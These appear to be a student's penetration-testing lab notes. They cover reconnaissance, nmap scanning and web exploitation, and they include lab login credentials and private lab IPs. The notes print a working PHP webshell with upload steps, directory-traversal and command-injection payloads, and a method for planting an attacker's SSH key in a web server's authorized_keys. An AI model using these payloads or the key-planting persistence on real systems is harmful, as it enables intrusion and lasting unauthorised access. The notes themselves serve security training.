
Usr: DABR-003-M
Pwd: IMO2qzSSbZMCdWv	
Piv: 10.50.35.227

http://10.50.22.9:8000/

winops: 192.168.65.10, 10.50.25.36    xfreerdp /v:10.50.25.36 /u:student /p:password /dynamic-resolution +clipboard
linops: 192.168.65.20, 10.50.32.167   ssh -X student@10.50.32.167
creds: student // password

###### System Recon

cat /etc/os-release   # os ver
lsb_release -a    # more os ver
uname -a    # kernel ver
hostnamectl   # kernel & os ver
# can be used in https://www.exploit-db.com/ to find exploites

## webpage scraping python script:
import lxml.html
import requests

page = requests.get('http://quotes.toscrape.com')
tree = lxml.html.fromstring(page.content)

authors = tree.xpath('//small[@class="author"]/text()')   # 

print ('Authors: ',authors)
# script end

## Scanning
1) Host Discovery
for i in {1..254}; do (ping -c 1 <first.three.oct>.$i | grep "bytes from" &) 2> /dev/null ;done   # ping sweep in bash
2) Host Enumeration
nmap <ip> -p- -T4   # quick scans all ports, use -Pn when using proxychains
3) Host Interrogation
nmap <ip> -Pn -T4 -sV -p <ports>   # grabs version of service on ports for service validation, or use --script=banner.nse instead of -sV

## nmap scripts
cat /usr/share/nmap/scripts/<scriptName>    # shows more information on script
nmap -Pn -T4 <ip> --script=<scriptName> -p <ports>    # runs a nmap script
nmap -Pn -T4 <ip> --script="<catName>" -p <ports>    # runs all nmap scripts that have the "catName" catagory


###### Web Exploitation

GET = Request info
POST = sending info (i.e. login creds)

# f12 to open dev window when on a web page
# can run functons by typing <function>() in the dev console

wget -r -l2 -P /tmp <ip>   # -r=recursive, -l2=2 levels deep, -P=copy to location
curl -o example.html http://www.website.com/    # specify different destination name

# good nmap http scripts: hht-enum.nse, http-robots.txt.nse

# robots.txt shows webcrawlers what and what not to index, lists posible web directories

nikto -h <ip>   # shows web directories that exist

## Directory Traversal
../../../../../../../../etc/passwd    # typed into searchboxes to try to navigate to root and then to desired directory
# dirs to try: 
/etc/passwd   # user information: loginshell (i.e. /bin/bash), home dir location (i.e. /root)
/etc/group    # user groups: root, adm, sudo (the good ones)
/etc/hosts    # ip's that hosts are maped to: shows ip's of interest(i.e. 192.168.18.1 webserver)
/etc/resolv.conf    # DNS server: shows ip networks we can scan for
/etc/networks   # 

# in dev console under 'network' under header of get request:
  myfile
	  somestuff
  submit
	  File look up
# does directory travel in one line: 
http://10.50.34.135/siteWithSearchbar.php?myfile=../../../../../etc/passwd&submit=File+look+up

## Malicious File Upload (Webshell)
# must be able to upload, file extensions must not be sanitized, must be able to access upload directory

nano webshell.php
  <HTML><BODY>
  <Form METHOD="GET" NAME="badform" ACTION="">
  <INPUT TYPE="text" NAME="cmd">
  <INPUT TYPE="submit" VALUE="hello">
  </Form>
  <?php system($_GET['cmd']);?>
  </BODY></HTML>

# upload this file ^ and navigate to "uploads" (or wherever web directory file was uploded to)
id    # or whoami to see if it worked

## Command Injection
# for input that run commands
; id    # enter in searchbar to verify that it works

## SSH Keys
# Pair with either Command Injection or Webshell

1) generate SSH Keys on whichever host you plan on logging in from, 
ssh-keygen -t rsa -b 4096		# generate keys

cat /home/student/.ssh/id_rsa.pub		# show your ssh key

2) Determine the user on the webserver
whoami (through Command Injection or Webshell)

3) Determine the user's home directory
/etc/passwd (again through Command Injection or Webshell)
# in this example the users home dir is /var/www

4) Determine if .ssh/ dir exists in the users home dir, if not create it
ls -la /var/www
# if its not there...
mkdir /var/www/.ssh		# creates ssh dir, use ls again to make sure it has been created

5) Inject our key into the authorized_keys file
echo "<your Key here>" > /var/www/.ssh/authorized_keys		# insert your ssh key from step 1

cat /var/www/.ssh/authorized_keys		# to check that key is there

6) Login from the workstation you generated the key from
ssh <username>@<ip>

## webservers default directory
http://10.50.34.125/ = /var/www/html		# this is NOT where we put .ssh





















generate keys
